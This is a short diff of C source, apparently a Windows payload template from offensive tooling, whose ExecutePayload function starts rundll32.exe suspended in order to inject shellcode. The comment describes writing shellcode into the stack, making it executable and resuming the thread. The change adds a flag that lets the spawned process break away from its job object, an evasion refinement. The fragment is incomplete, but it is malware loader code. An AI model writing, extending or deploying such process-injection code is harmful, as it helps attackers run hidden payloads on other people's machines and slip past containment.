@@ -4,7 +4,7 @@
 /* hand-rolled bzero allows us to avoid including ms vc runtime */
 void inline_bzero(void *p, size_t l)
 {
-   
+
            BYTE *q = (BYTE *)p;
            size_t x = 0;
            for (x = 0; x < l; x++)
@@ -50,7 +50,7 @@ void ExecutePayload(void) {
 	si.cb = sizeof(si);
 
 	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
-	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
+	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS|CREATE_BREAKAWAY_FROM_JOB, 0, 0, &si, &pi)) {
 		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 		GetThreadContext(pi.hThread, &ctx);
 
